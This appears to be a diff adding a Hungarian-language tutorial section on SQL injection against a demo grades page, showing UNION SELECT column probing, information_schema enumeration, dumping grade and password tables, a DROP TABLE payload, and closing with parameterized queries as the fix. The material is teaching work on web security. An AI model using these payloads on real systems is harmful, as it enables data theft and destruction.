@@ -189,4 +189,78 @@ Nagy Pal' OR 1=1 --
 
 Ez a bemenet ignorálja az eredeti lekérdezésben levő feltételt és minden sort kiír.
 
+Ahhoz, hogy a most eltüntetett kimenet mellett
+valamilyen saját kimenetet megjelenítsünk, az
+UNION SELECT műveletet használhatjuk. Ez viszont
+azt feltételezi, hogy a két select egyenlő
+mezőszámú eredményt adjon. azt látjuk, hogy
+az oldalon 3 oszlopban jelennek meg az
+erdemények, de ez nem feltétlenül jelenti azt,
+hogy a lekérdezés 3 mezőt ad eredményül.
+
+A következő bemenet például 3 mezőt eredményez
+a második SELECT-ben.
+
+```
+ ' OR 1=2 UNION SELECT 1, 2, 3 ; -- 
+```
+
+Erre még hibát kapunk, mert nem egyezik a mezőszám.
+A megfejtés a 4 mező lesz:
+
+```
+ ' AND 1=2 UNION SELECT 1, 2, 3, 4 ; -- 
+```
+
+A kimenetből az is látszik, hogy a weblap az
+első mezőt nem jeleníti meg.
+
+### Az adatbázis szerkezetének felderítése
+
+A következő lépés az adatbázis szerkezetének
+felderítése. Ez a következő bemenetekkel
+tehető meg:
+
+```
+ ' AND 1=2 UNION SELECT 1, table_schema, table_name, 1 FROM information_schema.tables; -- '
+```
+
+Ez megadja, hogy milyen táblák vannak az
+adatbázisban.
+
+```
+ ' AND 1=2 UNION SELECT 1, column_name, 1, 1 FROM information_schema.columns WHERE table_name='jegyek'; -- '
+```
+
+Ezzel pedig egy tábla mezőit tudja lekérdezni a támadó.
+
+### Egy tábla adatainak lekérdezése
+
+Most már csak a kiválasztott tábla tartalmának
+lekérdezése van hátra.
+
+```
+ ' AND 1=2 UNION SELECT 1, nev, targy, jegy FROM jegyek; -- '
+```
+
+Vagy ha lenne egy jelszavakat tároló tábla:
+
+```
+ ' AND 1=2 UNION SELECT 1, nev, jelszo, 1 FROM jelszavak; -- '
+```
+
+## Védekezési lehetőségek
+
+A MySQLi query függvénye csak egy lekérdezést
+hajt végre, így egy olyan bemenet, mint:
+
+```
+ ' ; DROP TABLE jegyek ; -- '
+```
+
+nem működik. Szerencsére. Az előző példák azonban
+igen.
+
+A hibát a lekérdezés kézi felépítése okozta.
+A MySQLi modulnak azonban megadhajtunk lekérdezés sablont is, ami ilyen formában nem sebezhető.
 
